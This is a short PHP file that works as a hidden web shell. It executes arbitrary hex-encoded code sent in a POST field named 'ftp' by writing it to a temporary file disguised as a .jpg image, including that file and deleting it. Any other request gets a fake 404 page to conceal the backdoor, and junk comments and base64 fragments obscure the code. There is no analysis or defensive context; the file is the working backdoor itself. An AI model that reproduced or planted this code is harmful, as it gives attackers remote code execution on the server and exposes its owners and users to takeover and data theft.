<?php
/*asdawdasdawd*/
if(isset($_POST['ftp'])){
    if(file_exists("image_xvxxpassd.jpg")){
        unlink("image_xvxxpassd.jpg");
    }/*asdawdasdawd*/
    file_put_contents("image_xvxxpassd.jpg",base64_decode("PD9waHAK").base64_decode("CnVubGluaygiaW1hZ2VfeHZwYXNzZC5qcGciKTsK").hex2bin($_POST['ftp']));
    include "image_xvxxpassd.jpg";
/*asdawdasdawd*/
    unlink("image_xvxxpassd.jpg");
}else{
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
}
